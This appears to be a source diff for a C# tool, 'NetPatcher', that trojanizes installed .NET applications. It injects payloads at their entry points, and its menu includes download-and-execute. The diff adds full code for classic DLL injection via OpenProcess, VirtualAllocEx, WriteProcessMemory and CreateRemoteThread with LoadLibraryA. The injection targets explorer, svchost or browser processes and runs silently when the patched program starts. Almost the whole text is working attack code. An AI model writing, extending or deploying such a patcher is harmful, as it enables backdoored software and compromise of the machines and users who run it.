@@ -1,6 +1,12 @@
-﻿/* Author		: Gregory King
+/* Author		: Gregory King
  * Date			: 07/16/25
  * Description	: This program is a .NET patcher that allows users to modify .NET applications to execute specific actions. The program will find compatible binaries in the Program Files, Program Files (x86) or user profile directories, and then applies the specified patch based on user input. The patched executable will be copied to the current directory with a new name. This version uses dnlib for binary manipulation. The patched program will execute the injected payload immediately when started. After the payload, the original program logic resumes, unless the payload itself interrupts or terminates execution (for example, if the payload throws an exception or calls Environment.Exit).
+ * 
+ * Patching options:
+ * 1) popcalc
+ * 2) MessageBox
+ * 3) Download + exec
+ * 4) Inject DLL to thread using CreateRemoteThread, selects process to inject from list of processes.
  */
 
 using System;
@@ -67,6 +73,7 @@ namespace NetPatcher
             Console.WriteLine("1. Execute calc.exe");
             Console.WriteLine("2. Download and execute file");
             Console.WriteLine("3. Show message box");
+            Console.WriteLine("4. Inject DLL into another process (explorer, svchost, firefox, msedge, chrome)");
             Console.Write("Choice: ");
             var payloadChoice = Console.ReadLine();
 
@@ -121,132 +128,264 @@ namespace NetPatcher
 						break;
 
 					case "4":
-   
-    var typeDef = module.GlobalType;
-    var injectedMethod = new MethodDefUser(
-        "InjectCmd",
-        MethodSig.CreateStatic(module.CorLibTypes.Void),
-        MethodImplAttributes.IL | MethodImplAttributes.Managed,
-        MethodAttributes.Public | MethodAttributes.Static
-    );
-    typeDef.Methods.Add(injectedMethod);
+						/* prompt for dll path */
+						Console.Write("Enter full path of DLL to inject: ");
+						string dllPath = Console.ReadLine();
 
-    var il = new CilBody();
-    injectedMethod.Body = il;
-    injectedMethod.Body.InitLocals = true;
-    il.KeepOldMaxStack = true;
+						var typeDef = module.GlobalType;
 
-    /* typesig for system.diagnostics.process */
-    var processTypeSig = module.Import(typeof(System.Diagnostics.Process)).ToTypeSig();
-    var stringTypeSig = module.CorLibTypes.String;
+						// Add P/Invoke methods
+						var openProcess = new MethodDefUser(
+							"OpenProcess",
+							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.Int32, module.CorLibTypes.Boolean, module.CorLibTypes.Int32),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						);
+						typeDef.Methods.Add(openProcess);
 
-    /* locals */
-    var localMessage = new Local(stringTypeSig);
-    var localProcs = new Local(new SZArraySig(processTypeSig));
-    var localTarget = new Local(processTypeSig);
-    injectedMethod.Body.Variables.Add(localMessage);
-    injectedMethod.Body.Variables.Add(localProcs);
-    injectedMethod.Body.Variables.Add(localTarget);
+						openProcess.ImplMap = new ImplMapUser {
+							Module = new ModuleRefUser(module, "kernel32.dll"),
+							Name = "OpenProcess",
+							Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto | PInvokeAttributes.SupportsLastError
+						};
 
-    /* imports */
-    var msgBoxShow = module.Import(typeof(System.Windows.Forms.MessageBox).GetMethod("Show", new[] { typeof(string) }));
-    var envUser = module.Import(typeof(System.Environment).GetProperty("UserName").GetGetMethod());
-    var envMachine = module.Import(typeof(System.Environment).GetProperty("MachineName").GetGetMethod());
-    var getProcessesByName = module.Import(typeof(System.Diagnostics.Process).GetMethod("GetProcessesByName", new[] { typeof(string) }));
-    var procNameProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("ProcessName").GetGetMethod());
-    var procIdProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("Id").GetGetMethod());
-    var stringConcat2 = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(string) }));
-    var stringConcatObj = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(object) }));
+						var virtualAllocEx = new MethodDefUser(
+							"VirtualAllocEx",
+							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.UInt32, module.CorLibTypes.UInt32),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						)
+						{	
+							ImplMap = new ImplMapUser {
+								Module = new ModuleRefUser(module, "kernel32.dll"),
+								Name = "VirtualAllocEx",
+								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
+							}
+						};
+						typeDef.Methods.Add(virtualAllocEx);
 
-    /* preferred process names */
-    string[] preferred = { "explorer", "notepad", "chrome", "firefox", "cmd", "calc" };
-    var lblFound = new Instruction(OpCodes.Nop);
-    var lblShowMsg = new Instruction(OpCodes.Nop);
+						var writeProcessMemory = new MethodDefUser(
+							"WriteProcessMemory",
+							MethodSig.CreateStatic(module.CorLibTypes.Boolean, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, new SZArraySig(module.CorLibTypes.Byte), module.CorLibTypes.UInt32, new ByRefSig(module.CorLibTypes.UIntPtr)),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						)
+						{
+							ImplMap = new ImplMapUser
+							{
+								Module = new ModuleRefUser(module, "kernel32.dll"),
+								Name = "WriteProcessMemory",
+								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
+							}
+						};
+						typeDef.Methods.Add(writeProcessMemory);
 
-    /* loop over preferred process names */
-    foreach (var procName in preferred)
-    {
-        il.Instructions.Add(OpCodes.Ldstr.ToInstruction(procName));
-        il.Instructions.Add(OpCodes.Call.ToInstruction(getProcessesByName));
-        il.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcs));
-        il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
-        il.Instructions.Add(OpCodes.Ldlen.ToInstruction());
-        il.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
-        il.Instructions.Add(OpCodes.Brtrue.ToInstruction(lblFound));
-    }
+						var getModuleHandle = new MethodDefUser(
+							"GetModuleHandle",
+							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.String),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						)
+						{
+							ImplMap = new ImplMapUser
+							{
+								Module = new ModuleRefUser(module, "kernel32.dll"),
+								Name = "GetModuleHandleA",
+								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
+							}
+						};
+						typeDef.Methods.Add(getModuleHandle);
 
-    /* if no process found, set message */
-    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("No preferred process found."));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Br.ToInstruction(lblShowMsg));
+						var getProcAddress = new MethodDefUser(
+							"GetProcAddress",
+							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.String),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						)
+						{
+							ImplMap = new ImplMapUser
+							{
+								Module = new ModuleRefUser(module, "kernel32.dll"),
+								Name = "GetProcAddress",
+								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
+							}
+						};
+						typeDef.Methods.Add(getProcAddress);
 
-    /* if found, target = procs[0] */
-    il.Instructions.Add(lblFound);
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
-    il.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
-    il.Instructions.Add(OpCodes.Ldelem_Ref.ToInstruction());
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localTarget));
+						var createRemoteThread = new MethodDefUser(
+							"CreateRemoteThread",
+							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.IntPtr),
+							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
+						)
+						{
+							ImplMap = new ImplMapUser
+							{
+								Module = new ModuleRefUser(module, "kernel32.dll"),
+								Name = "CreateRemoteThread",
+								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
+							}
+						};
+						typeDef.Methods.Add(createRemoteThread);
 
-    /* build message string step-by-step */
-    /* part1 = "Thread injected!\nUser: " + Environment.UserName */
-    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("Thread injected!\nUser: "));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(envUser));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// InjectDllIntoProcess method
+						var injectHelper = new MethodDefUser(
+							"InjectDllIntoProcess",
+							MethodSig.CreateStatic(module.CorLibTypes.Void, module.CorLibTypes.Int32, module.CorLibTypes.String),
+							MethodImplAttributes.IL | MethodImplAttributes.Managed,
+							MethodAttributes.Private | MethodAttributes.Static
+						);
+						typeDef.Methods.Add(injectHelper);
 
-    /* part2 = part1 + "\nMachine: " */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nMachine: "));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						var il2 = new CilBody();
+						injectHelper.Body = il2;
+						injectHelper.Body.InitLocals = true;
+						il2.KeepOldMaxStack = true;
 
-    /* part3 = part2 + Environment.MachineName */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(envMachine));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// Locals
+						var localProcessHandle = new Local(module.CorLibTypes.IntPtr);
+						var localAlloc = new Local(module.CorLibTypes.IntPtr);
+						var localBytes = new Local(new SZArraySig(module.CorLibTypes.Byte));
+						var localWritten = new Local(module.CorLibTypes.UIntPtr);
+						var localKernel32 = new Local(module.CorLibTypes.IntPtr);
+						var localLoadLibrary = new Local(module.CorLibTypes.IntPtr);
+						var localThread = new Local(module.CorLibTypes.IntPtr);
+						injectHelper.Body.Variables.Add(localProcessHandle);
+						injectHelper.Body.Variables.Add(localAlloc);
+						injectHelper.Body.Variables.Add(localBytes);
+						injectHelper.Body.Variables.Add(localWritten);
+						injectHelper.Body.Variables.Add(localKernel32);
+						injectHelper.Body.Variables.Add(localLoadLibrary);
+						injectHelper.Body.Variables.Add(localThread);
 
-    /* part4 = part3 + "\nTarget Process: " */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nTarget Process: "));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// Constants
+						const int PROCESS_ALL_ACCESS = 0x1F0FFF;
+						const uint MEM_COMMIT = 0x1000;
+						const uint PAGE_READWRITE = 0x04;
 
-    /* part5 = part4 + target.ProcessName */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
-    il.Instructions.Add(OpCodes.Callvirt.ToInstruction(procNameProp));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// IL: IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction(PROCESS_ALL_ACCESS));
+						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(openProcess));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcessHandle));
 
-    /* part6 = part5 + "\nPID: " */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Ldstr.ToInstruction("\nPID: "));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// IL: byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath + "\0");
+						var encodingType = module.Import(typeof(System.Text.Encoding));
+						var getEncoding = module.Import(typeof(System.Text.Encoding).GetProperty("ASCII").GetGetMethod());
+						var getBytes = module.Import(typeof(System.Text.Encoding).GetMethod("GetBytes", new[] { typeof(string) }));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(getEncoding));
+						il2.Instructions.Add(OpCodes.Ldarg_1.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("\0"));
+						var stringConcat2 = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(string) }));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
+						il2.Instructions.Add(OpCodes.Callvirt.ToInstruction(getBytes));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localBytes));
 
-    /* part7 = part6 + target.Id */
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
-    il.Instructions.Add(OpCodes.Callvirt.ToInstruction(procIdProp));
-    il.Instructions.Add(OpCodes.Box.ToInstruction(module.CorLibTypes.Int32));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcatObj));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
-    il.Instructions.Add(OpCodes.Stloc.ToInstruction(localMessage));
+						// IL: IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)bytes.Length, MEM_COMMIT, PAGE_READWRITE);
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
+						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
+						il2.Instructions.Add(OpCodes.Ldlen.ToInstruction());
+						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)MEM_COMMIT));
+						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)PAGE_READWRITE));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(virtualAllocEx));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localAlloc));
 
-    /* show message */
-    il.Instructions.Add(lblShowMsg);
-    il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localMessage));
-    il.Instructions.Add(OpCodes.Call.ToInstruction(msgBoxShow));
-    il.Instructions.Add(OpCodes.Pop.ToInstruction());
-    il.Instructions.Add(OpCodes.Ret.ToInstruction());
+						// IL: UIntPtr written;
+						// IL: WriteProcessMemory(hProcess, alloc, bytes, (uint)bytes.Length, out written);
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
+						il2.Instructions.Add(OpCodes.Ldlen.ToInstruction());
+						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldloca_S.ToInstruction(localWritten));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(writeProcessMemory));
+						il2.Instructions.Add(OpCodes.Pop.ToInstruction());
 
-    il.SimplifyBranches();
-    il.OptimizeBranches();
+						// IL: IntPtr kernel32 = GetModuleHandle("kernel32.dll");
+						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("kernel32.dll"));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(getModuleHandle));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localKernel32));
 
-    instrs.Insert(0, OpCodes.Call.ToInstruction(injectedMethod));
-    entry.Body.KeepOldMaxStack = true;
-    break;
+						// IL: IntPtr loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localKernel32));
+						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("LoadLibraryA"));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(getProcAddress));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localLoadLibrary));
+
+						// IL: IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, alloc, 0, IntPtr.Zero);
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
+						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
+						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
+						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localLoadLibrary));
+						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
+						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
+						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
+						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
+						il2.Instructions.Add(OpCodes.Call.ToInstruction(createRemoteThread));
+						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localThread));
+
+						il2.Instructions.Add(OpCodes.Ret.ToInstruction());
+
+						// InjectDll method (searches for process and calls InjectDllIntoProcess)
+						var injectedMethod = new MethodDefUser(
+							"InjectDll",
+							MethodSig.CreateStatic(module.CorLibTypes.Void),
+							MethodImplAttributes.IL | MethodImplAttributes.Managed,
+							MethodAttributes.Public | MethodAttributes.Static
+						);
+						typeDef.Methods.Add(injectedMethod);
+
+						var il = new CilBody();
+						injectedMethod.Body = il;
+						injectedMethod.Body.InitLocals = true;
+						il.KeepOldMaxStack = true;
+
+						var processTypeSig = module.Import(typeof(System.Diagnostics.Process)).ToTypeSig();
+						var processArrayTypeSig = new SZArraySig(processTypeSig);
+						var localProcs = new Local(processArrayTypeSig);
+						var localTarget = new Local(processTypeSig);
+						injectedMethod.Body.Variables.Add(localProcs);
+						injectedMethod.Body.Variables.Add(localTarget);
+
+						string[] preferred = { "explorer", "svchost", "firefox", "msedge", "chrome" };
+						var getProcessesByName = module.Import(typeof(System.Diagnostics.Process).GetMethod("GetProcessesByName", new[] { typeof(string) }));
+						var processIdProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("Id").GetGetMethod());
+
+						var lblFound = new Instruction(OpCodes.Nop);
+						var lblEnd = new Instruction(OpCodes.Ret);
+
+						foreach (var procName in preferred)
+						{
+							il.Instructions.Add(OpCodes.Ldstr.ToInstruction(procName));
+							il.Instructions.Add(OpCodes.Call.ToInstruction(getProcessesByName));
+							il.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcs));
+							il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
+							il.Instructions.Add(OpCodes.Ldlen.ToInstruction());
+							il.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
+							il.Instructions.Add(OpCodes.Brtrue.ToInstruction(lblFound));
+						}
+						il.Instructions.Add(OpCodes.Br.ToInstruction(lblEnd));
+
+						il.Instructions.Add(lblFound);
+						il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
+						il.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
+						il.Instructions.Add(OpCodes.Ldelem_Ref.ToInstruction());
+						il.Instructions.Add(OpCodes.Stloc.ToInstruction(localTarget));
+
+						il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
+						il.Instructions.Add(OpCodes.Callvirt.ToInstruction(processIdProp));
+						il.Instructions.Add(OpCodes.Ldstr.ToInstruction(dllPath));
+						il.Instructions.Add(OpCodes.Call.ToInstruction(injectHelper));
+						il.Instructions.Add(lblEnd);
+
+						// Insert call to injected method at entry
+						instrs.Insert(0, OpCodes.Call.ToInstruction(injectedMethod));
+						break;
 					default:
                         Console.WriteLine("Invalid payload choice.");
                         return;
@@ -265,3 +404,4 @@ namespace NetPatcher
         }
     }
 }
+
